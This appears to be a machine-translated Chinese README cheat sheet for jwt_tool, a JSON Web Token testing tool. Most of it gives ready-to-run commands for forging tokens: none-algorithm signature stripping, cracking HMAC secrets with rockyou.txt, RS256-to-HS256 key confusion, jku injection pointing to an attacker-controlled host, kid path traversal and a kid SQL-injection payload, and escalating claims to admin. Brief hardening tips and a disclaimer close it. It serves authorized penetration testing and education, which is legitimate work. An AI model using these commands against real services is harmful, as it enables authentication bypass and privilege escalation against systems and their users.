<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🪙 jwt_tool - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
       ██╗██╗    ██╗████████╗    ████████╗ ██████╗  ██████╗ ██╗     
       ██║██║    ██║╚══██╔══╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
       ██║██║ █╗ ██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ██   ██║██║███╗██║   ██║          ██║   ██║   ██║██║   ██║██║     
  ╚█████╔╝╚███╔███╔╝   ██║          ██║   ╚██████╔╝╚██████╔╝███████╗
   ╚════╝  ╚══╝╚══╝    ╚═╝          ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
        All-in-One JSON Web Token Manipulation & Exploitation Suite
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/jwt__tool-Token_Exploitation-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Author-ticarpi-orange?style=for-the-badge" alt="ticarpi">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="网络安全">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p对齐=“中心”>
  <b>🪙强大的Python CLI工具包，用于分析、篡改、伪造、扫描和破解JSON Web Tokens (JWT)</b>
</p>

---

## 📋 目录

- [概述与 JWT 剖析](#-overview--jwt-anatomy)
- [安装](#-安装)
- [令牌解析和检查](#-token-parsing--inspection)
- [自动漏洞扫描(`-M at`)](#-automated-vulnerability-scanning--m-at)
- [常见利用场景](#-common-exploitation-scenarios)
  - [算法混乱/无攻击(`none`)](#algorithm-confusion--none-attack-none)
  - [HMAC 密钥破解](#hmac-secret-key-cracking)
  - [密钥混淆：带公钥的 RS256 到 HS256](#key-confusion-rs256-to-hs256-with-public-key)
  - [标头注入：JKU、X5U 和 JWK 欺骗](#header-injection-jku-x5u--jwk-spoofing)
  - [KID 注入（SQLi 和路径遍历）](#kid-injection-sqli--path-traversal)
- [有效负载篡改和伪造声明](#-有效负载篡改--伪造-声明)
- [快速参考表](#-quick-reference-table)
- [防御考虑和强化](#-defective-considerations--hardening)
- [法律免责声明](#-legal-disclaimer)

---

## 🎯 概述和 JWT 剖析

JSON Web 令牌 (RFC 7519) 由三个以点分隔的 Base64URL 编码段 (`.`) 组成：
`header.payload.signature`

1. **标头：** 标识令牌类型（`typ`）和签名算法（`alg`，例如 `HS256`、`RS256`、`none`）。
2. **有效负载：** 包含用户声明（`sub`、`role`、`admin`、`exp`）。
3. **签名：** 防止客户端篡改的加密验证哈希。

**jwt_tool** 由 **ticarpi** 创建，可自动测试跨 API 和现代 Web 应用程序的 JWT 身份验证工作流程中的架构和实现缺陷。

---

## 📥 安装
```bash
# Clone the repository
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool

# Install dependencies
pip install -r requirements.txt

# Run jwt_tool
python3 jwt_tool.py --help
```
---

## 🔍 令牌解析和检查

解码并检查标头参数和有效负载声明：
```bash
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOmZhbHNlfQ.signature
```
---

## ⚡ 自动漏洞扫描（`-M at`）

启动自动 playbook 扫描，针对目标 Web 服务测试已知漏洞：
```bash
# Run All Tests (-M at) sending requests to web endpoint
python3 jwt_tool.py <JWT_TOKEN> \
  -M at \
  -u "https://api.target.com/user/profile" \
  -rh "Authorization: Bearer <JWT_TOKEN>"
```
*执行的测试：*
- 签名剥离（无算法变体）
- RSA 到 HMAC 密钥混淆
- 声明篡改（`admin=true`，权限升级）
- 注入 `kid`、`jku`、`x5u` 标头
- 空签名处理

---

## 💥 常见的利用场景

### 算法混乱/无攻击 (`none`)
当后端实现接受未签名的令牌时：
```bash
# Forge token with 'none' algorithm and stripped signature
python3 jwt_tool.py <JWT_TOKEN> -X a
```
*自动测试的变体：* `none`、`None`、`NONE`、`nOnE`。

### HMAC 密钥破解
当HS256/HS384/HS512使用弱密码时：
```bash
# Dictionary attack using rockyou.txt
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt
```
### 密钥混淆：带公钥的 RS256 到 HS256
如果服务器使用 RSA (RS256) 进行签名，但接受使用其公共证书作为共享 HMAC 密钥的 HMAC (HS256)：
```bash
# Forge token using server public key file
python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem
```
### 标头注入：JKU、X5U 和 JWK 欺骗
注入攻击者控制的密钥或 URL：
```bash
# Inject attacker-controlled JWKS URL in jku header
python3 jwt_tool.py <JWT_TOKEN> -I -hc jku -hv "https://attacker.com/jwks.json" -S hs256 -k secret
```
### KID 注入（SQLi 和路径遍历）
如果后端直接在数据库查询或文件路径中使用`kid`（Key ID）标头参数：
```bash
# Path traversal pointing to /dev/null (empty secret)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "/dev/null" -S hs256 -p ""

# SQL Injection in kid header to bypass signature verification
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1' UNION SELECT 'my_secret'--" -S hs256 -p "my_secret"
```
---

## ✍️ 有效负载篡改和伪造声明

修改特定的声明值并放弃令牌：
```bash
# Change claim 'admin' to true and 'role' to 'SuperAdmin' using known secret
python3 jwt_tool.py <JWT_TOKEN> \
  -T \
  -pc "admin" -pv "true" \
  -pc "role" -pv "SuperAdmin" \
  -k "secret_key"
```
---

## ⚡ 快速参考表

|目标|命令 |
|------------|---------|
| **解码和解析令牌** | `python3 jwt_tool.py <JWT>` |
| **多合一剧本扫描** | `python3 jwt_tool.py <JWT> -M at -u <URL> -rh "Auth: Bearer <JWT>"` |
| **破解 HMAC 秘密** | `python3 jwt_tool.py <JWT> -C -d rockyou.txt` |
| **使用 None 算法绕过** | `python3 jwt_tool.py <JWT> -X a` |
| **RS256 -> HS256 混乱** | `python3 jwt_tool.py <JWT> -X k -pk public.pem` |
| **篡改有效负载和签名** | `python3 jwt_tool.py <JWT> -T -pc admin -pv true -k <KEY>` |
| **KID 路径遍历** | `python3 jwt_tool.py <JWT> -I -hc kid -hv "/dev/null" -S hs256 -p ""` |

---

## 🛡️ 防守考虑和强化

1. **严格的算法白名单：** 绝不接受`none`或算法切换。显式验证预期算法（仅限 `RS256`）。
2. **拒绝客户端控制的密钥：** 不要在没有严格域白名单的情况下盲目信任来自不受信任输入的 `jku`、`jwk` 或 `x5u` 标头。
3. **使用强秘密：** 确保 HMAC 密钥至少为 256 位高熵加密随机字节。

---

## ⚠️ 法律免责声明

> [!警告]
> jwt_tool 专为授权渗透测试、API 漏洞评估和教育研究而设计。未经书面许可，伪造令牌访问未经授权的系统是严格违法的。